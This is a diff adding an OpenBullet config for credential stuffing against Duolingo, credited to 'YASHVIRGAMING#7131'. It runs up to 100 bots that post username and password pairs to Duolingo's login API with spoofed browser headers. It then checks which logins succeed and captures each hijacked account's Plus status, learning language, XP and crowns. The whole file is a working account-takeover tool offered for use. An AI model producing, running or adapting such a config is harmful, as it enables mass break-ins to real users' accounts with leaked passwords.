@@ -1,0 +1,80 @@
+[SETTINGS]
+{
+  "Name": "duolingo",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-01-05T09:09:54.8415925+00:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#login REQUEST POST "https://www.duolingo.com/2017-06-30/login" 
+  CONTENT "{\"distinctId\":\"285aa4d9-bcbe-4df8-bc24-8c44a8084c83\",\"identifier\":\"<USER>\",\"password\":\"<PASS>\",\"landingUrl\":\"https://fr.duolingo.com/\",\"lastReferrer\":\"https://www.google.com/\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: fr.duolingo.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Origin: https://fr.duolingo.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://fr.duolingo.com/?isLoggingIn=true" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{}" 
+  KEYCHAIN Success OR 
+    KEY "{\"emailComment\":true,\"" 
+
+#duolingo_plus PARSE "<SOURCE>" LR ",\"web_duolingo_plus\":{\"name\":\"web_duolingo_plus\",\"eligible\":" ",\"" CreateEmpty=FALSE -> CAP "duolingo_plus" "|" "|" 
+
+#Languages PARSE "<SOURCE>" LR ",\"learningLanguage\":\"" "\"," CreateEmpty=FALSE -> CAP "Languages" "|" "|" 
+
+#XP PARSE "<SOURCE>" LR ",\"xp\":" ",\"" CreateEmpty=FALSE -> CAP "XP" "|" "|" 
+
+#CROWNS PARSE "<SOURCE>" LR ",\"crowns\":" ",\"" CreateEmpty=FALSE -> CAP "crowns" "|" "|" 
+
+FUNCTION Constant "🔥 YASHVIRGAMING#7131 🔥" -> CAP "Config by" 
+
